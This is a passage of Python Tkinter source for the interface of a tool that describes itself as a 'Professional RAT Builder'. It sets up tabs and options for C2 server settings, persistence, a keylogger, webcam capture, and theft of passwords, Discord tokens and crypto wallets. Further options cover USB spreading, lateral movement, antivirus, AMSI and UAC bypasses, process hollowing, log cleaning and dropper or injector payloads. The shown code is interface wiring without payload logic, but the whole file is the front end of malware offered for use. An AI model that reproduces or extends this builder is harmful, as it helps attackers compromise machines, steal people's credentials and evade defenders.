        edit_menu.add_command(label="Paste", accelerator="Ctrl+V", command=self._paste)
        edit_menu.add_separator()
        edit_menu.add_command(label="Select All", accelerator="Ctrl+A", command=self._select_all)
        edit_menu.add_command(label="Find", accelerator="Ctrl+F", command=self._find)
        
        # Build menu
        build_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Build", menu=build_menu)
        build_menu.add_command(label="Generate Payload", accelerator="F5", command=self._generate_payload)
        build_menu.add_command(label="Build EXE", accelerator="F7", command=self._build_exe)
        build_menu.add_command(label="Test Payload", accelerator="F8", command=self._test_payload)
        build_menu.add_separator()
        build_menu.add_command(label="Clean Build", command=self._clean_build)
        build_menu.add_command(label="Build Options", command=self._build_options)
        
        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        tools_menu.add_command(label="C2 Server", command=self._start_c2_server)
        tools_menu.add_command(label="Connection Test", command=self._test_connection)
        tools_menu.add_command(label="Obfuscation Test", command=self._test_obfuscation)
        tools_menu.add_separator()
        tools_menu.add_command(label="Icon Generator", command=self._generate_icon)
        tools_menu.add_command(label="Resource Editor", command=self._edit_resources)
        tools_menu.add_command(label="Payload Encoder", command=self._encode_payload)
        
        # View menu
        view_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="View", menu=view_menu)
        
        # Theme submenu
        theme_menu = tk.Menu(view_menu, tearoff=0)
        view_menu.add_cascade(label="Theme", menu=theme_menu)
        for theme in ThemeManager.THEMES.keys():
            theme_menu.add_radiobutton(
                label=theme.replace('_', ' ').title(),
                variable=tk.StringVar(value=self.current_theme),
                value=theme,
                command=lambda t=theme: self._change_theme(t)
            )
        
        view_menu.add_separator()
        view_menu.add_checkbutton(label="Toolbar", command=self._toggle_toolbar)
        view_menu.add_checkbutton(label="Status Bar", command=self._toggle_status_bar)
        view_menu.add_separator()
        view_menu.add_command(label="Full Screen", accelerator="F11", command=self._toggle_fullscreen)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="Documentation", accelerator="F1", command=self._show_docs)
        help_menu.add_command(label="Tutorial", command=self._show_tutorial)
        help_menu.add_separator()
        help_menu.add_command(label="Check for Updates", command=self._check_updates)
        help_menu.add_command(label="About", command=self._show_about)
        
        # Bind keyboard shortcuts
        self.root.bind('<Control-n>', lambda e: self._new_config())
        self.root.bind('<Control-o>', lambda e: self._load_config())
        self.root.bind('<Control-s>', lambda e: self._save_config())
        self.root.bind('<F5>', lambda e: self._generate_payload())
        self.root.bind('<F7>', lambda e: self._build_exe())
        self.root.bind('<F11>', lambda e: self._toggle_fullscreen())
        self.root.bind('<F1>', lambda e: self._show_docs())
    
    def _create_main_container(self):
        """Create main container with notebook"""
        # Main container
        main_container = ttk.Frame(self.root)
        main_container.grid(row=0, column=0, sticky="nsew", padx=2, pady=2)
        main_container.grid_rowconfigure(0, weight=1)
        main_container.grid_columnconfigure(0, weight=1)
        
        # Create notebook
        self.notebook = ttk.Notebook(main_container)
        self.notebook.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        
        # Create tabs
        tab_names = [
            "Dashboard",
            "Basic Settings", 
            "Features",
            "Evasion",
            "Stealth",
            "Network",
            "Payload",
            "Build",
            "Server",
            "Logs"
        ]
        
        for name in tab_names:
            frame = ttk.Frame(self.notebook)
            self.notebook.add(frame, text=name)
            self.tabs[name] = frame
        
        # Bind tab change event
        self.notebook.bind("<<NotebookTabChanged>>", self._on_tab_changed)
        
        # Initialize tab contents
        self._init_dashboard()
        self._init_basic_settings()
        self._init_features()
        self._init_evasion()
        self._init_stealth()
        self._init_network()
        self._init_payload()
        self._init_build()
        self._init_server()
        self._init_logs()
    
    def _create_status_bar(self):
        """Create status bar"""
        self.status_bar = ttk.Frame(self.root)
        self.status_bar.grid(row=1, column=0, sticky="ew", padx=5, pady=2)
        
        # Status text
        self.status_text = tk.StringVar(value="Ready")
        status_label = ttk.Label(self.status_bar, textvariable=self.status_text)
        status_label.pack(side="left", padx=10)
        
        # Progress bar
        self.progress_bar = ttk.Progressbar(self.status_bar, mode='determinate', length=100)
        self.progress_bar.pack(side="right", padx=10, pady=2)
        
        # Version label
        version_label = ttk.Label(self.status_bar, text=f"v{VERSION}")
        version_label.pack(side="right", padx=10)
    
    def _center_window(self):
        """Center window on screen"""
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f"{width}x{height}+{x}+{y}")
    
    def _init_dashboard(self):
        """Initialize dashboard tab"""
        frame = self.tabs["Dashboard"]
        
        # Welcome section
        welcome_frame = ttk.Frame(frame)
        welcome_frame.pack(fill="x", padx=20, pady=20)
        
        ttk.Label(
            welcome_frame, 
            text=f"Welcome to {APP_NAME}",
            style="Title.TLabel"
        ).pack(pady=10)
        
        ttk.Label(
            welcome_frame,
            text="Professional RAT Builder with Complete GUI",
            style="Subtitle.TLabel"
        ).pack()
        
        # Stats section
        stats_frame = ttk.LabelFrame(frame, text="Quick Statistics", padding=20)
        stats_frame.pack(fill="x", padx=20, pady=10)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack()
        
        stats = [
            ("Active Features", "0"),
            ("Evasion Techniques", "0"),
            ("Stealth Options", "0"),
            ("Payload Size", "0 KB"),
            ("Build Time", "0s"),
            ("Success Rate", "100%")
        ]
        
        for i, (label, value) in enumerate(stats):
            stat_frame = ttk.Frame(stats_grid)
            stat_frame.grid(row=i//3, column=i%3, padx=20, pady=10)
            
            ttk.Label(stat_frame, text=label, font=("Segoe UI", 9)).pack()
            ttk.Label(stat_frame, text=value, font=("Segoe UI", 16, "bold")).pack()
        
        # Quick actions
        actions_frame = ttk.LabelFrame(frame, text="Quick Actions", padding=20)
        actions_frame.pack(fill="x", padx=20, pady=10)
        
        actions = [
            ("Generate Payload", self._generate_payload, "primary"),
            ("Build EXE", self._build_exe, "success"),
            ("Start C2 Server", self._start_c2_server, "accent"),
            ("Test Connection", self._test_connection, "warning")
        ]
        
        for text, command, style in actions:
            btn = ttk.Button(
                actions_frame, 
                text=text, 
                command=command,
                style=f"{style.title()}.TButton" if style != "primary" else "TButton",
                width=20
            )
            btn.pack(side="left", padx=10, pady=5)
        
        # Recent projects
        recent_frame = ttk.LabelFrame(frame, text="Recent Projects", padding=20)
        recent_frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        # Treeview for recent projects
        columns = ("Name", "Type", "Date", "Size", "Status")
        recent_tree = ttk.Treeview(recent_frame, columns=columns, show="headings", height=5)
        
        for col in columns:
            recent_tree.heading(col, text=col)
            recent_tree.column(col, width=100)
        
        # Add sample data
        sample_data = [
            ("Backdoor.exe", "EXE", "2024-01-15", "2.3 MB", "Tested"),
            ("Client.py", "Python", "2024-01-14", "45 KB", "Obfuscated"),
            ("Server.exe", "EXE", "2024-01-13", "3.1 MB", "Built"),
            ("Test.exe", "EXE", "2024-01-12", "1.8 MB", "Failed")
        ]
        
        for item in sample_data:
            recent_tree.insert("", "end", values=item)
        
        scrollbar = ttk.Scrollbar(recent_frame, orient="vertical", command=recent_tree.yview)
        recent_tree.configure(yscrollcommand=scrollbar.set)
        
        recent_tree.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
    
    def _init_basic_settings(self):
        """Initialize basic settings tab"""
        frame = self.tabs["Basic Settings"]
        
        # Create scrollable frame
        canvas = tk.Canvas(frame)
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # C2 Settings
        c2_frame = ttk.LabelFrame(scrollable_frame, text="C2 Server Settings", padding=15)
        c2_frame.pack(fill="x", padx=20, pady=10)
        
        ttk.Label(c2_frame, text="C2 IP/Host:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.entry_c2_ip = ttk.Entry(c2_frame, width=30)
        self.entry_c2_ip.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.entry_c2_ip.insert(0, self.config['basic']['c2_ip'])
        
        ttk.Label(c2_frame, text="Port:").grid(row=0, column=2, sticky="w", pady=5, padx=20)
        self.entry_c2_port = ttk.Entry(c2_frame, width=10)
        self.entry_c2_port.grid(row=0, column=3, sticky="w", pady=5, padx=5)
        self.entry_c2_port.insert(0, str(self.config['basic']['c2_port']))
        
        ttk.Label(c2_frame, text="Protocol:").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.combo_protocol = ttk.Combobox(c2_frame, values=PROTOCOLS, width=10, state="readonly")
        self.combo_protocol.grid(row=1, column=1, sticky="w", pady=5, padx=5)
        self.combo_protocol.set(self.config['basic']['protocol'].upper())
        
        # Installation Settings
        install_frame = ttk.LabelFrame(scrollable_frame, text="Installation Settings", padding=15)
        install_frame.pack(fill="x", padx=20, pady=10)
        
        ttk.Label(install_frame, text="Install Name:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.entry_install_name = ttk.Entry(install_frame, width=30)
        self.entry_install_name.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.entry_install_name.insert(0, self.config['basic']['install_name'])
        
        ttk.Label(install_frame, text="Install Path:").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        path_frame = ttk.Frame(install_frame)
        path_frame.grid(row=1, column=1, sticky="w", pady=5, padx=5, columnspan=2)
        
        self.entry_install_path = ttk.Entry(path_frame, width=25)
        self.entry_install_path.pack(side="left", padx=5)
        self.entry_install_path.insert(0, self.config['basic']['install_path'])
        
        ttk.Button(path_frame, text="Browse", command=self._browse_install_path).pack(side="left")
        
        # Common paths
        common_paths = ttk.Combobox(path_frame, values=[
            "%APPDATA%\\Microsoft\\Windows",
            "%TEMP%",
            "%PROGRAMDATA%",
            "%USERPROFILE%",
            "C:\\Windows\\System32"
        ], width=20)
        common_paths.pack(side="left", padx=5)
        common_paths.bind("<<ComboboxSelected>>", 
                         lambda e: self.entry_install_path.delete(0, tk.END) or 
                                  self.entry_install_path.insert(0, common_paths.get()))
        
        ttk.Label(install_frame, text="Startup Name:").grid(row=2, column=0, sticky="w", pady=5, padx=5)
        self.entry_startup_name = ttk.Entry(install_frame, width=30)
        self.entry_startup_name.grid(row=2, column=1, sticky="w", pady=5, padx=5)
        self.entry_startup_name.insert(0, self.config['basic']['startup_name'])
        
        ttk.Label(install_frame, text="Mutex Name:").grid(row=3, column=0, sticky="w", pady=5, padx=5)
        self.entry_mutex_name = ttk.Entry(install_frame, width=30)
        self.entry_mutex_name.grid(row=3, column=1, sticky="w", pady=5, padx=5)
        self.entry_mutex_name.insert(0, self.config['basic']['mutex_name'])
        
        # System Information
        sys_frame = ttk.LabelFrame(scrollable_frame, text="System Information", padding=15)
        sys_frame.pack(fill="x", padx=20, pady=10)
        
        sys_info = f"""
        Hostname: {socket.gethostname()}
        Username: {getpass.getuser()}
        System: {platform.system()} {platform.release()}
        Python: {platform.python_version()}
        Architecture: {platform.machine()}
        IP Address: {self._get_local_ip()}
        """
        
        ttk.Label(sys_frame, text=sys_info, justify="left").pack(anchor="w")
    
    def _init_features(self):
        """Initialize features tab"""
        frame = self.tabs["Features"]
        
        # Create scrollable frame with canvas
        canvas = tk.Canvas(frame)
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Feature categories
        categories = {
            "Surveillance": [
                ("Keylogger", "keylogger"),
                ("Screenshot", "screenshot"),
                ("Audio Capture", "audio_capture"),
                ("Webcam Capture", "webcam_capture"),
                ("Clipboard Monitor", "clipboard_monitor")
            ],
            "System Control": [
                ("Remote Shell", "remote_shell"),
                ("Process Manager", "process_manager"),
                ("File Explorer", "file_explorer"),
                ("System Info", "system_info")
            ],
            "Data Collection": [
                ("Password Stealer", "password_stealer"),
                ("Browser History", "browser_history"),
                ("Discord Token", "discord_token"),
                ("Crypto Wallet", "crypto_wallet"),
                ("Email Stealer", "email_stealer")
            ],
            "Network": [
                ("Network Scanner", "network_scanner"),
                ("USB Spreader", "usb_spreader")
            ],
            "Persistence": [
                ("Persistence", "persistence"),
                ("Privilege Escalation", "privilege_escalation"),
                ("Lateral Movement", "lateral_movement"),
                ("Data Exfiltration", "data_exfiltration")
            ]
        }
        
        self.feature_vars = {}
        
        for category, features in categories.items():
            # Category frame
            cat_frame = ttk.LabelFrame(scrollable_frame, text=category, padding=15)
            cat_frame.pack(fill="x", padx=20, pady=10)
            
            # Create checkboxes for each feature
            for i, (name, key) in enumerate(features):
                var = tk.BooleanVar(value=self.config['features'].get(key, False))
                self.feature_vars[key] = var
                
                # Create feature frame
                feat_frame = ttk.Frame(cat_frame)
                feat_frame.grid(row=i//2, column=i%2, sticky="w", padx=10, pady=5)
                
                # Checkbox
                cb = ttk.Checkbutton(feat_frame, text=name, variable=var)
                cb.pack(anchor="w")
                
                # Description
                desc = self._get_feature_description(key)
                ttk.Label(feat_frame, text=desc, font=("Segoe UI", 8), 
                         foreground="gray").pack(anchor="w")
    
    def _init_evasion(self):
        """Initialize evasion techniques tab"""
        frame = self.tabs["Evasion"]
        
        canvas = tk.Canvas(frame)
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Evasion categories
        categories = {
            "Code Obfuscation": [
                ("Code Obfuscation", "CODE_OBFUSCATION"),
                ("String Encryption", "STRING_ENCRYPTION"),
                ("API Hashing", "API_HASHING"),
                ("Shellcode Encryption", "SHELLCODE_ENCRYPTION")
            ],
            "Anti-Analysis": [
                ("Anti-VM", "ANTI_VM"),
                ("Anti-Debug", "ANTI_DEBUG"),
                ("Anti-Sandbox", "ANTI_SANDBOX")
            ],
            "Process Manipulation": [
                ("Process Injection", "PROCESS_INJECTION"),
                ("Module Stomping", "MODULE_STOMPING"),
                ("Thread Hijacking", "THREAD_HIJACKING"),
                ("Process Hollowing", "PROCESS_HOLLOWING")
            ],
            "Advanced Techniques": [
                ("Reflective Loading", "REFLECTIVE_LOADING"),
                ("Polymorphism", "POLYMORPHISM"),
                ("Metamorphism", "METAMORPHISM"),
                ("Packing", "PACKING"),
                ("Crypter", "CRYPTER")
            ]
        }
        
        self.evasion_vars = {}
        
        for category, techniques in categories.items():
            cat_frame = ttk.LabelFrame(scrollable_frame, text=category, padding=15)
            cat_frame.pack(fill="x", padx=20, pady=10)
            
            for i, (name, key) in enumerate(techniques):
                var = tk.BooleanVar(value=self.config['evasion'].get(key, False))
                self.evasion_vars[key] = var
                
                tech_frame = ttk.Frame(cat_frame)
                tech_frame.grid(row=i//2, column=i%2, sticky="w", padx=10, pady=5)
                
                cb = ttk.Checkbutton(tech_frame, text=name, variable=var)
                cb.pack(anchor="w")
                
                desc = self._get_evasion_description(key)
                ttk.Label(tech_frame, text=desc, font=("Segoe UI", 8),
                         foreground="gray").pack(anchor="w")
    
    def _init_stealth(self):
        """Initialize stealth techniques tab"""
        frame = self.tabs["Stealth"]
        
        canvas = tk.Canvas(frame)
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Stealth categories
        categories = {
            "File Stealth": [
                ("File Hidden", "FILE_HIDDEN"),
                ("Time Stomping", "TIME_STOMPING"),
                ("Signature Spoofing", "SIGNATURE_SPOOFING")
            ],
            "Process Stealth": [
                ("Process Hidden", "PROCESS_HIDDEN"),
                ("Memory Hidden", "MEMORY_HIDDEN")
            ],
            "Network Stealth": [
                ("Network Hidden", "NETWORK_HIDDEN"),
                ("Firewall Bypass", "FIREWALL_BYPASS")
            ],
            "System Bypass": [
                ("UAC Bypass", "UAC_BYPASS"),
                ("Defender Bypass", "DEFENDER_BYPASS"),
                ("AMSI Bypass", "AMSI_BYPASS"),
                ("ETW Bypass", "ETW_BYPASS")
            ],
            "Forensics": [
                ("Registry Hidden", "REGISTRY_HIDDEN"),
                ("Disk Hidden", "DISK_HIDDEN"),
                ("Log Cleaner", "LOG_CLEANER"),
                ("Anti-Forensics", "ANTI_FORENSICS")
            ]
        }
        
        self.stealth_vars = {}
        
        for category, techniques in categories.items():
            cat_frame = ttk.LabelFrame(scrollable_frame, text=category, padding=15)
            cat_frame.pack(fill="x", padx=20, pady=10)
            
            for i, (name, key) in enumerate(techniques):
                var = tk.BooleanVar(value=self.config['stealth'].get(key, False))
                self.stealth_vars[key] = var
                
                tech_frame = ttk.Frame(cat_frame)
                tech_frame.grid(row=i//2, column=i%2, sticky="w", padx=10, pady=5)
                
                cb = ttk.Checkbutton(tech_frame, text=name, variable=var)
                cb.pack(anchor="w")
                
                desc = self._get_stealth_description(key)
                ttk.Label(tech_frame, text=desc, font=("Segoe UI", 8),
                         foreground="gray").pack(anchor="w")
    
    def _init_network(self):
        """Initialize network settings tab"""
        frame = self.tabs["Network"]
        
        # Create scrollable frame
        canvas = tk.Canvas(frame)
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Connection settings
        conn_frame = ttk.LabelFrame(scrollable_frame, text="Connection Settings", padding=15)
        conn_frame.pack(fill="x", padx=20, pady=10)
        
        ttk.Label(conn_frame, text="Reconnect Interval (sec):").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.entry_reconnect = ttk.Entry(conn_frame, width=10)
        self.entry_reconnect.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.entry_reconnect.insert(0, str(self.config['network']['reconnect_interval']))
        
        ttk.Label(conn_frame, text="Timeout (sec):").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.entry_timeout = ttk.Entry(conn_frame, width=10)
        self.entry_timeout.grid(row=1, column=1, sticky="w", pady=5, padx=5)
        self.entry_timeout.insert(0, str(self.config['network']['timeout']))
        
        ttk.Label(conn_frame, text="Retry Count:").grid(row=2, column=0, sticky="w", pady=5, padx=5)
        self.entry_retry = ttk.Entry(conn_frame, width=10)
        self.entry_retry.grid(row=2, column=1, sticky="w", pady=5, padx=5)
        self.entry_retry.insert(0, str(self.config['network']['retry_count']))
        
        # Protocol options
        proto_frame = ttk.LabelFrame(scrollable_frame, text="Protocol Options", padding=15)
        proto_frame.pack(fill="x", padx=20, pady=10)
        
        self.var_https = tk.BooleanVar(value=self.config['network']['use_https'])
        self.var_dns = tk.BooleanVar(value=self.config['network']['use_dns'])
        self.var_tor = tk.BooleanVar(value=self.config['network']['use_tor'])
        self.var_proxy = tk.BooleanVar(value=self.config['network']['use_proxy'])
        
        ttk.Checkbutton(proto_frame, text="Use HTTPS", variable=self.var_https).grid(row=0, column=0, sticky="w", pady=5, padx=5)
        ttk.Checkbutton(proto_frame, text="Use DNS Tunneling", variable=self.var_dns).grid(row=0, column=1, sticky="w", pady=5, padx=5)
        ttk.Checkbutton(proto_frame, text="Use Tor Proxy", variable=self.var_tor).grid(row=1, column=0, sticky="w", pady=5, padx=5)
        ttk.Checkbutton(proto_frame, text="Use Proxy", variable=self.var_proxy).grid(row=1, column=1, sticky="w", pady=5, padx=5)
        
        # Proxy settings
        proxy_frame = ttk.LabelFrame(scrollable_frame, text="Proxy Settings", padding=15)
        proxy_frame.pack(fill="x", padx=20, pady=10)
        
        ttk.Label(proxy_frame, text="Proxy Host:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.entry_proxy_host = ttk.Entry(proxy_frame, width=30)
        self.entry_proxy_host.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.entry_proxy_host.insert(0, self.config['network']['proxy_host'])
        
        ttk.Label(proxy_frame, text="Proxy Port:").grid(row=0, column=2, sticky="w", pady=5, padx=20)
        self.entry_proxy_port = ttk.Entry(proxy_frame, width=10)
        self.entry_proxy_port.grid(row=0, column=3, sticky="w", pady=5, padx=5)
        self.entry_proxy_port.insert(0, str(self.config['network']['proxy_port']))
        
        # User Agent
        ua_frame = ttk.LabelFrame(scrollable_frame, text="User Agent", padding=15)
        ua_frame.pack(fill="x", padx=20, pady=10)
        
        self.text_user_agent = scrolledtext.ScrolledText(ua_frame, height=3, width=80)
        self.text_user_agent.pack(fill="x", padx=5, pady=5)
        self.text_user_agent.insert("1.0", self.config['network']['user_agent'])
    
    def _init_payload(self):
        """Initialize payload options tab"""
        frame = self.tabs["Payload"]
        
        canvas = tk.Canvas(frame)
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Payload type
        type_frame = ttk.LabelFrame(scrollable_frame, text="Payload Type", padding=15)
        type_frame.pack(fill="x", padx=20, pady=10)
        
        ttk.Label(type_frame, text="Type:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.combo_payload_type = ttk.Combobox(type_frame, values=["stub", "dropper", "downloader", "injector"], 
                                              width=15, state="readonly")
        self.combo_payload_type.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.combo_payload_type.set(self.config['payload']['type'])
        
        ttk.Label(type_frame, text="Method:").grid(row=0, column=2, sticky="w", pady=5, padx=20)
        self.combo_payload_method = ttk.Combobox(type_frame, values=["standard", "reflective", "process"], 
                                                width=15, state="readonly")
        self.combo_payload_method.grid(row=0, column=3, sticky="w", pady=5, padx=5)
        self.combo_payload_method.set(self.config['payload']['method'])
        
        ttk.Label(type_frame, text="Injection Target:").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.entry_injection_target = ttk.Entry(type_frame, width=20)
        self.entry_injection_target.grid(row=1, column=1, sticky="w", pady=5, padx=5)
        self.entry_injection_target.insert(0, self.config['payload']['injection_target'])
        
        # Advanced options
        adv_frame = ttk.LabelFrame(scrollable_frame, text="Advanced Options", padding=15)
        adv_frame.pack(fill="x", padx=20, pady=10)
        
        ttk.Label(adv_frame, text="Encryption Key:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.entry_enc_key = ttk.Entry(adv_frame, width=40)
        self.entry_enc_key.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.entry_enc_key.insert(0, self.config['advanced']['encryption_key'])
        
        ttk.Button(adv_frame, text="Generate", command=self._generate_encryption_key).grid(row=0, column=2, padx=5)
        
        ttk.Label(adv_frame, text="Compression Level (0-9):").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.scale_compression = ttk.Scale(adv_frame, from_=0, to=9, orient="horizontal")
        self.scale_compression.set(self.config['advanced']['compression_level'])
        self.scale_compression.grid(row=1, column=1, sticky="ew", pady=5, padx=5)
        
        ttk.Label(adv_frame, text="Obfuscation Level (1-5):").grid(row=2, column=0, sticky="w", pady=5, padx=5)
        self.scale_obfuscation = ttk.Scale(adv_frame, from_=1, to=5, orient="horizontal")
        self.scale_obfuscation.set(self.config['advanced']['obfuscation_level'])
        self.scale_obfuscation.grid(row=2, column=1, sticky="ew", pady=5, padx=5)
        
        # Icon settings
        icon_frame = ttk.LabelFrame(scrollable_frame, text="Icon Settings", padding=15)
        icon_frame.pack(fill="x", padx=20, pady=10)
        
        ttk.Label(icon_frame, text="Icon File:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.entry_icon = ttk.Entry(icon_frame, width=40)
        self.entry_icon.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.entry_icon.insert(0, self.config['advanced']['icon_file'])
        
        ttk.Button(icon_frame, text="Browse", command=self._browse_icon).grid(row=0, column=2, padx=5)
        ttk.Button(icon_frame, text="Generate Icon", command=self._generate_icon).grid(row=0, column=3, padx=5)
        
        # Architecture
        arch_frame = ttk.LabelFrame(scrollable_frame, text="Architecture", padding=15)
        arch_frame.pack(fill="x", padx=20, pady=10)
        
        self.var_arch = tk.StringVar(value=self.config['advanced']['architecture'])
        ttk.Radiobutton(arch_frame, text="x86 (32-bit)", variable=self.var_arch, value="x86").pack(side="left", padx=20)
        ttk.Radiobutton(arch_frame, text="x64 (64-bit)", variable=self.var_arch, value="x64").pack(side="left", padx=20)
        ttk.Radiobutton(arch_frame, text="Both", variable=self.var_arch, value="both").pack(side="left", padx=20)
        
        # Custom code
        code_frame = ttk.LabelFrame(scrollable_frame, text="Custom Code Injection", padding=15)
        code_frame.pack(fill="x", padx=20, pady=10)
        
        self.text_custom_code = scrolledtext.ScrolledText(code_frame, height=10)
        self.text_custom_code.pack(fill="x", padx=5, pady=5)
        self.text_custom_code.insert("1.0", self.config['advanced']['custom_code'])
    
    def _init_build(self):
        """Initialize build tab"""
        frame = self.tabs["Build"]
        
        # Output settings
        output_frame = ttk.LabelFrame(frame, text="Output Settings", padding=15)
        output_frame.pack(fill="x", padx=20, pady=10)
        
        ttk.Label(output_frame, text="Output Directory:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.entry_output_dir = ttk.Entry(output_frame, width=40)
        self.entry_output_dir.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.entry_output_dir.insert(0, os.path.join(os.getcwd(), "output"))
        
        ttk.Button(output_frame, text="Browse", command=self._browse_output).grid(row=0, column=2, padx=5)
        
        ttk.Label(output_frame, text="Output Name:").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.entry_output_name = ttk.Entry(output_frame, width=30)
        self.entry_output_name.grid(row=1, column=1, sticky="w", pady=5, padx=5)
        self.entry_output_name.insert(0, "payload")
        
        # Build options
        build_frame = ttk.LabelFrame(frame, text="Build Options", padding=15)
        build_frame.pack(fill="x", padx=20, pady=10)
        
        self.var_upx = tk.BooleanVar(value=self.config['advanced']['upx_pack'])
        self.var_anti = tk.BooleanVar(value=self.config['advanced']['anti_analysis'])
        self.var_junk = tk.BooleanVar(value=self.config['payload']['junk_code'])
        self.var_fake = tk.BooleanVar(value=self.config['payload']['fake_messages'])
        
        ttk.Checkbutton(build_frame, text="UPX Packing", variable=self.var_upx).grid(row=0, column=0, sticky="w", pady=5, padx=5)
        ttk.Checkbutton(build_frame, text="Anti-Analysis", variable=self.var_anti).grid(row=0, column=1, sticky="w", pady=5, padx=5)
        ttk.Checkbutton(build_frame, text="Junk Code", variable=self.var_junk).grid(row=0, column=2, sticky="w", pady=5, padx=5)
        ttk.Checkbutton(build_frame, text="Fake Messages", variable=self.var_fake).grid(row=1, column=0, sticky="w", pady=5, padx=5)
        
        # Build buttons
        button_frame = ttk.Frame(frame)
        button_frame.pack(fill="x", padx=20, pady=20)
        
        ttk.Button(button_frame, text="Generate Payload", command=self._generate_payload, width=20).pack(side="left", padx=10)
        ttk.Button(button_frame, text="Build EXE", command=self._build_exe, width=20).pack(side="left", padx=10)
        ttk.Button(button_frame, text="Test Payload", command=self._test_payload, width=20).pack(side="left", padx=10)
        ttk.Button(button_frame, text="Clean Build", command=self._clean_build, width=20).pack(side="left", padx=10)
        
        # Log area
        log_frame = ttk.LabelFrame(frame, text="Build Log", padding=15)
        log_frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        self.build_log = scrolledtext.ScrolledText(log_frame, height=15)
        self.build_log.pack(fill="both", expand=True, padx=5, pady=5)
        
        ttk.Button(log_frame, text="Clear Log", command=self._clear_build_log).pack(anchor="e", pady=5)
    
    def _init_server(self):
        """Initialize server tab"""
        frame = self.tabs["Server"]
        
        # Server configuration
        config_frame = ttk.LabelFrame(frame, text="Server Configuration", padding=15)
        config_frame.pack(fill="x", padx=20, pady=10)
        
        ttk.Label(config_frame, text="Bind IP:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.entry_server_ip = ttk.Entry(config_frame, width=20)
        self.entry_server_ip.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.entry_server_ip.insert(0, "0.0.0.0")
        
        ttk.Label(config_frame, text="Port:").grid(row=0, column=2, sticky="w", pady=5, padx=20)
        self.entry_server_port = ttk.Entry(config_frame, width=10)
        self.entry_server_port.grid(row=0, column=3, sticky="w", pady=5, padx=5)
        self.entry_server_port.insert(0, "8080")
        
